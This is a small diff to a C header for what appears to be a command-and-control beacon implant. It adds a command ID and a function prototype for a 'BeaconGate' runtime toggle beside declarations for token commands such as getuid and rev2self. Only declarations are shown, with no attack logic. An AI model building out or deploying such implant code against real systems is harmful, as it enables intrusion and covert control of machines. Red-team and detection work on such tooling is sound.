@@ -130,6 +130,11 @@ void command_beacon_info(char * buffer, int length, void (*callback)(char * buff
  * the vendored picoc VM (src/interpreter/binterp.cpp for the wire format) */
 void command_interpreter(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 
+/* C-58 BeaconGate (4.10) runtime toggle: [int enable] - enable=All,
+ * disable=off (settings 96/97 live rewrite) */
+#define COMMAND_BEACON_GATE 123
+void command_beacon_gate(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
+
 /* token related commands */
 void command_getuid(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 void command_rev2self();
